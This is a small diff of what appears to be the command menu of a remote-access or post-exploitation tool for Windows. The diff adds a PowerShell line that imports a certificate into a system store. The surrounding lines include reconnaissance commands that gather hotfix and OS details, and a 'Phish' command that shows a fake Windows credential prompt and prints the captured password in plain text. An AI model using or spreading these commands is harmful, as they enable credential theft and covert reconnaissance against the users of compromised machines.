@@ -1,4 +1,5 @@
 Send File:C:\Temp\
+Install Cert:powershell "Import-Certificate -FilePath $cert -CertStoreLocation $store"
 Get PS Version:powershell "$PSVersionTable"
 Get SysInfo:powershell "gwmi Win32_QuickFixEngineering | Select Description, HotFixID, InstalledBy, InstalledOn; gwmi Win32_OperatingSystem | Select Caption, ServicePackMajorVersion, OSArchitecture, BootDevice, BuildNumber, CSName, CSDVersion, NumberOfUsers, Version | FL"
 Windows PSv3+ Phish:powershell "Get-Credential -User $(whoami).Split('\')[1] -Message 'Windows requires your credentials to continue' | % {Write-Host $_.UserName '->' $_.GetNetworkCredential().password}"
